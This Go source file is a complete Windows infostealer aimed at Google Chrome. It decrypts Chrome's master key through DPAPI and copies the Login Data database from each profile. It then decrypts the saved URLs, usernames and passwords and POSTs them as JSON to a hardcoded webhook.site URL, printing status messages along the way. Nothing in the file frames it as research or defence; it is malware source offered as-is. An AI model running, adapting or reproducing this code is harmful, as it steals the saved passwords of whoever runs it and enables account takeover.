package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

type LoginEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func getMasterKey() ([]byte, error) {
	localStatePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState map[string]interface{}
	json.Unmarshal(data, &localState)
	encKeyB64 := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil, err
	}

	encKey = encKey[5:]

	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(encKey)),
		Data: &encKey[0],
	}
	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(uintptr(unsafe.Pointer(outBlob.Data))))

	return outBlobToBytes(outBlob), nil
}

func outBlobToBytes(blob windows.DataBlob) []byte {
	data := make([]byte, blob.Size)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))[:])
	return data
}

func decryptPassword(encrypted []byte, key []byte) (string, error) {
	if !strings.HasPrefix(string(encrypted), "v10") {
		return "", fmt.Errorf("unsupported format")
	}
	encrypted = encrypted[3:]

	iv := encrypted[:12]
	ciphertext := encrypted[12 : len(encrypted)-16]
	tag := encrypted[len(encrypted)-16:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

func collectCredentials(aesKey []byte) ([]LoginEntry, error) {
	results := []LoginEntry{}
	userDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")

	profiles, _ := os.ReadDir(userDataPath)
	for _, p := range profiles {
		if !p.IsDir() || !(strings.HasPrefix(p.Name(), "Default") || strings.HasPrefix(p.Name(), "Profile")) {
			continue
		}

		loginData := filepath.Join(userDataPath, p.Name(), "Login Data")
		tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("LoginData_%s.db", p.Name()))

		data, err := os.ReadFile(loginData)
		if err != nil {
			continue
		}
		os.WriteFile(tmpCopy, data, 0600)

		db, err := sql.Open("sqlite3", tmpCopy)
		if err != nil {
			continue
		}
		defer db.Close()

		rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
		if err != nil {
			continue
		}

		for rows.Next() {
			var url, username string
			var encPwd []byte

			err = rows.Scan(&url, &username, &encPwd)
			if err != nil {
				continue
			}

			decPwd, err := decryptPassword(encPwd, aesKey)
			if err != nil {
				continue
			}

			results = append(results, LoginEntry{
				URL:      url,
				Username: username,
				Password: decPwd,
			})
		}
		rows.Close()
	}

	return results, nil
}

func sendToWebhook(entries []LoginEntry) error {
	webhookURL := "https://webhook.site/22e554a9-13f0-4bff-aab5-a932d268db9e"

	payload, err := json.Marshal(entries)
	if err != nil {
		return err
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // just to drain it

	return nil
}

func main() {
	aesKey, err := getMasterKey()
	if err != nil {
		fmt.Println("[!] Failed to get AES key:", err)
		return
	}

	entries, err := collectCredentials(aesKey)
	if err != nil {
		fmt.Println("[!] Failed to collect credentials:", err)
		return
	}

	err = sendToWebhook(entries)
	if err != nil {
		fmt.Println("[!] Failed to send to webhook:", err)
		return
	}

	fmt.Println("[+] Data sent to webhook successfully.")
}
